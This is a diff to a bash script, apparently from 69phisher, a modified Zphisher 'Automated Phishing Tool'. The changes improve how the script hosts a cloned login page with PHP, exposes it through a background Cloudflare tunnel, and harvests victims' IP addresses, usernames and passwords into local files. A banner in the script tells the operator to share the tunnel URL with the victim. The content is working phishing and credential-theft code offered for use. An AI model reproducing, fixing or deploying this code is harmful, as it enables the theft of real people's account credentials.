@@ -3,7 +3,7 @@
 
 ##   69phisher 	: 	Automated Phishing Tool
 ##   Author 	: 	Akshay 
-##   Version 	: 	1.5-official
+##   Version 	: 	1.5-fixed
 ##   Github 	: 	https://github.com/Akshay-Arjun
 ## Modified version of :
 ##   Zphisher 	: 	Automated Phishing Tool
@@ -45,6 +45,9 @@ fi
 ## Script termination
 exit_on_signal_SIGINT() {
     { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+    # Kill cloudflared
+    killall cloudflared > /dev/null 2>&1
+    killall php > /dev/null 2>&1
     # Restore config if it was backed up
     if [[ -f "$HOME/.cloudflared/config.yaml.backup" ]]; then
     	mv "$HOME/.cloudflared/config.yaml.backup" "$HOME/.cloudflared/config.yaml" 2>/dev/null
@@ -54,6 +57,9 @@ exit_on_signal_SIGINT() {
 
 exit_on_signal_SIGTERM() {
     { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated. Thank you for using & Happy Hacking" 2>&1; reset_color; }
+    # Kill cloudflared
+    killall cloudflared > /dev/null 2>&1
+    killall php > /dev/null 2>&1
     # Restore config if it was backed up
     if [[ -f "$HOME/.cloudflared/config.yaml.backup" ]]; then
     	mv "$HOME/.cloudflared/config.yaml.backup" "$HOME/.cloudflared/config.yaml" 2>/dev/null
@@ -243,36 +249,38 @@ PORT='8080'
 
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
-	cp -rf .sites/"$website"/* .server/www
-	cp -f .sites/ip.php .server/www/
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+	cp -rf .sites/"$website"/* .server/www 2>/dev/null
+	cp -f .sites/ip.php .server/www/ 2>/dev/null
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server on ${CYAN}$HOST:$PORT${BLUE}..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
+	sleep 1
+	cd - > /dev/null 2>&1
 }
 
 ## Get IP address
 capture_ip() {
-	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+	IP=$(grep -a 'IP:' .server/www/ip.txt 2>/dev/null | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
-	cat .server/www/ip.txt >> ip.txt
+	cat .server/www/ip.txt >> ip.txt 2>/dev/null
 }
 
 ## Get credentials
 capture_creds() {
-	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
-	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
+	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt 2>/dev/null | cut -d " " -f2)
+	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt 2>/dev/null | cut -d ":" -f2)
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
-	cat .server/www/usernames.txt >> usernames.dat
+	cat .server/www/usernames.txt >> usernames.dat 2>/dev/null
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit...\n"
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
@@ -290,31 +298,44 @@ capture_data() {
 }
 
 
-## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
-## Credits HTR-TECH
-
 ## Start Cloudflared using official TryCloudflare method
 ## https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/trycloudflare/
 start_cloudflared() { 
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared TryCloudflare tunnel..."
-
+	setup_site
+	
 	# Check if cloudflared exists and is executable
 	if [[ ! -x "./.server/cloudflared" ]]; then
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} ERROR: Cloudflared binary not found or not executable"
 		{ reset_color; exit 1; }
 	fi
 
-	# Start cloudflared tunnel using official TryCloudflare method
-	# Command: cloudflared tunnel --url http://localhost:8080
-	# Output will contain: https://randomstring.trycloudflare.com
-	
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared TryCloudflare tunnel..."${WHITE}
 	echo -e "\n${ORANGE}[${WHITE}*${ORANGE}]${CYAN} Cloudflared will print tunnel URL below:"
 	echo -e "${ORANGE}[${WHITE}*${ORANGE}]${CYAN} Look for line containing 'trycloudflare.com'${WHITE}\n"
 	
-	# Run cloudflared tunnel - this will output the URL to stdout
-	./.server/cloudflared tunnel --url "http://$HOST:$PORT"
+	# Start cloudflared tunnel in BACKGROUND
+	# This will output the URL to stdout which user can see
+	# Command: cloudflared tunnel --url http://localhost:8080
+	./.server/cloudflared tunnel --url "http://$HOST:$PORT" 2>&1 &
+	local cfd_pid=$!
+	
+	# Wait a moment for cloudflared to establish tunnel and print URL
+	sleep 3
+	
+	# Check if cloudflared is still running
+	if ! kill -0 $cfd_pid 2>/dev/null; then
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} ERROR: Cloudflared failed to start"
+		echo -e "${RED}[${WHITE}!${RED}]${RED} Make sure cloudflared v2020.5.1 or later is installed"
+		{ reset_color; exit 1; }
+	fi
+	
+	echo -e "\n${GREENBG}${BLACK} Tunnel URL should appear above - copy and share with victim ${RESETBG}"
+	echo -e "\n${ORANGE}[${WHITE}*${ORANGE}]${CYAN} Cloudflared is running in background (PID: $cfd_pid)"
+	echo -e "${ORANGE}[${WHITE}*${ORANGE}]${CYAN} PHP server listening on http://$HOST:$PORT"
+	
+	# Now monitor for credentials while cloudflared runs in background
+	capture_data
 }
 
 
